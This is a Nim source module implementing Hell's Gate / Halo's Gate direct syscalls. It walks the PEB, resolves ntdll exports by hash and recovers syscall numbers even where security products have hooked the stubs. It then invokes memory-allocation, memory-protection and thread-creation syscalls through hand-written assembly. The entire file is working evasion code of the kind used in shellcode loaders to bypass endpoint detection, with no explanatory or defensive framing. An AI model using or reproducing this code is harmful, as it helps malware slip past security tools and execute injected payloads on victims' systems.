import winim
import hash

type
  NT_SYSCALL* = object
    pAddress*: PVOID
    dwHash*: uint32
    dwSSn*: uint32
  PNT_SYSCALL* = ptr NT_SYSCALL

  VX_TABLE* = object
    NtAllocateVirtualMemory*: NT_SYSCALL
    NtProtectVirtualMemory*: NT_SYSCALL
    NtCreateThreadEx*: NT_SYSCALL
    NtWaitForSingleObject*: NT_SYSCALL
  PVX_TABLE* = ptr VX_TABLE

  NTDLL_CONFIG* = object
    uModule*: pointer
    dwNumberOfNames*: DWORD
    pdwArrayOfNames*: ptr UncheckedArray[DWORD]
    pdwArrayOfAddresses*: ptr UncheckedArray[DWORD]
    pwArrayOfOrdinals*: ptr UncheckedArray[WORD]
  PNTDLL_CONFIG* = ptr NTDLL_CONFIG

#[ Global Var ]#
var 
  wSystemCall*: uint32
  gNtdllConf*: NTDLL_CONFIG
const
  RANGE = 255
  UP = 32
  DOWN = -32


proc getPPEB*(): PPEB {.asmNoStackFrame, inline.}= 
  asm """
    mov rax, qword ptr gs:[0x60]
    ret
  """

proc initNtdllConfigStructure(): bool =
  var pPeb = getPPEB()
  if (cast[int](pPeb) == 0):
    return false
  var 
    pLdr = cast[PLDR_DATA_TABLE_ENTRY](cast[int](pPeb.Ldr.InMemoryOrderModuleList.Flink.Flink) - 0x10)
    uModule = cast[pointer](pLdr.DllBase)
  if cast[int](uModule) == 0:
    return false
  var pImgDosHdr = cast[PIMAGE_DOS_HEADER](uModule)
  if pImgDosHdr.e_magic != IMAGE_DOS_SIGNATURE:
    return false
  var pImgNtHdrs = cast[PIMAGE_NT_HEADERS](cast[int](uModule) + pImgDosHdr.e_lfanew)
  if pImgNtHdrs.Signature != IMAGE_NT_SIGNATURE:
    return false
  var pImgExpDir = cast[PIMAGE_EXPORT_DIRECTORY](cast[int](uModule) + pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
  if cast[int](pImgExpDir) == 0:
    return false

  gNtdllConf.uModule = uModule
  gNtdllConf.dwNumberOfNames = pImgExpDir.NumberOfNames
  gNtdllConf.pdwArrayOfNames = cast[ptr UncheckedArray[DWORD]](cast[int](uModule) + pImgExpDir.AddressOfNames)
  gNtdllConf.pdwArrayOfAddresses = cast[ptr UncheckedArray[DWORD]](cast[int](uModule) + pImgExpDir.AddressOfFunctions)
  gNtdllConf.pwArrayOfOrdinals = cast[ptr UncheckedArray[WORD]](cast[int](uModule) + pImgExpDir.AddressOfNameOrdinals)

  return true


proc fetchNtSyscall(dwSysHash: uint32, pNtSys: PNT_SYSCALL): bool =
  if cast[int](gNtdllConf.uModule) == 0:
    if not initNtdllConfigStructure():
      return false
  
  for i in 0 ..< gNtdllConf.dwNumberOfNames:
    var 
      pczFunctionName = cast[PCHAR](cast[int](gNtdllConf.uModule) + cast[int](gNtdllConf.pdwArrayOfNames[i]))
      pFunctionAddress = cast[PVOID](cast[int](gNtdllConf.uModule) + cast[int](gNtdllConf.pdwArrayOfAddresses[gNtdllConf.pwArrayOfOrdinals[i]]))

    pNtSys.pAddress = pFunctionAddress

    # if syscall found
    if hashStrA(cast[cstring](pczFunctionName)) == dwSysHash:
      if (cast[PBYTE](cast[int](pFunctionAddress) + 0)[] == 0x4c) and
              (cast[PBYTE](cast[int](pFunctionAddress) + 1)[] == 0x8b) and
              (cast[PBYTE](cast[int](pFunctionAddress) + 2)[] == 0xd1) and
              (cast[PBYTE](cast[int](pFunctionAddress) + 3)[] == 0xb8) and
              (cast[PBYTE](cast[int](pFunctionAddress) + 6)[] == 0x00) and
              (cast[PBYTE](cast[int](pFunctionAddress) + 7)[] == 0x00):
        var 
          h = cast[PBYTE](cast[int](pFunctionAddress) + 5)[]
          l = cast[PBYTE](cast[int](pFunctionAddress) + 4)[]
        pNtSys.dwSSn = ((h shl 8) or l).uint32
        break

      # if hooked: check1
      if (cast[PBYTE](pFunctionAddress)[] == 0xe9): 
        for idx in 1 .. RANGE:
          # check syscall down
          if (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 0)[] == 0x4c) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 1)[] == 0x8b) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 2)[] == 0xd1) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 3)[] == 0xb8) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 6)[] == 0x00) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 7)[] == 0x00):
            var 
              h = cast[PBYTE](cast[int](pFunctionAddress) + 5 + (idx*DOWN))[]
              l = cast[PBYTE](cast[int](pFunctionAddress) + 4 + (idx*DOWN))[]
            pNtSys.dwSSn = ((h shl 8) or l).uint32
            break
          # check syscall up
          if (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 0)[] == 0x4c) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 1)[] == 0x8b) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 2)[] == 0xd1) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 3)[] == 0xb8) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 6)[] == 0x00) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 7)[] == 0x00):
            var 
              h = cast[PBYTE](cast[int](pFunctionAddress) + 5 + (idx*UP))[]
              l = cast[PBYTE](cast[int](pFunctionAddress) + 4 + (idx*UP))[]
            pNtSys.dwSSn = ((h shl 8) or l).uint32
            break

      # if hooked: check2
      if (cast[PBYTE](cast[int](pFunctionAddress) + 3)[] == 0xe9): 
        for idx in 1 .. RANGE:
          # check syscall down
          if (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 0)[] == 0x4c) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 1)[] == 0x8b) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 2)[] == 0xd1) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 3)[] == 0xb8) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 6)[] == 0x00) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*DOWN) + 7)[] == 0x00):
            var 
              h = cast[PBYTE](cast[int](pFunctionAddress) + 5 + (idx*DOWN))[]
              l = cast[PBYTE](cast[int](pFunctionAddress) + 4 + (idx*DOWN))[]
            pNtSys.dwSSn = ((h shl 8) or l).uint32
            break
          # check syscall up
          if (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 0)[] == 0x4c) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 1)[] == 0x8b) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 2)[] == 0xd1) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 3)[] == 0xb8) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 6)[] == 0x00) and
                  (cast[PBYTE](cast[int](pFunctionAddress) + (idx*UP) + 7)[] == 0x00):
            var 
              h = cast[PBYTE](cast[int](pFunctionAddress) + 5 + (idx*UP))[]
              l = cast[PBYTE](cast[int](pFunctionAddress) + 4 + (idx*UP))[]
            pNtSys.dwSSn = ((h shl 8) or l).uint32
            break
      break

  if (pNtSys.dwSSn != 0) and (cast[int](pNtSys.pAddress) != 0) and (pNtSys.dwHash != 0):
    return true
  return false


proc SetSSn*(wSys: uint32) {.asmNoStackFrame.} = 
  asm """
    xor rax, rax
    mov `wSystemCall`, eax
    mov eax, ecx
    mov r8d, eax
    mov `wSystemCall`, r8d
    ret
  """

proc RunSyscall*(arg1: auto): NTSTATUS {.asmNoStackFrame, varargs.} =
  asm """
    xor r10, r10
    mov rax, rcx
    mov r10, rax
    mov eax, `wSystemCall`
    jmp $+11
    xor eax, eax
    xor rcx, rcx
    shl r10, 2
    syscall
    ret
  """


proc initHG*(t: PVX_TABLE): bool = 
  var pPeb = getPPEB()
  
  t.NtAllocateVirtualMemory.dwHash = static(hashStrA("NtAllocateVirtualMemory"))
  if not fetchNtSyscall(t.NtAllocateVirtualMemory.dwHash, t.NtAllocateVirtualMemory): 
    return false

  t.NtCreateThreadEx.dwHash = static(hashStrA("NtCreateThreadEx"))
  if not fetchNtSyscall(t.NtCreateThreadEx.dwHash, t.NtCreateThreadEx): 
    return false

  t.NtProtectVirtualMemory.dwHash = static(hashStrA("NtProtectVirtualMemory"))
  if not fetchNtSyscall(t.NtProtectVirtualMemory.dwHash, t.NtProtectVirtualMemory): 
    return false

  t.NtWaitForSingleObject.dwHash = static(hashStrA("NtWaitForSingleObject"))
  if not fetchNtSyscall(t.NtWaitForSingleObject.dwHash, t.NtWaitForSingleObject): 
    return false
  
  return true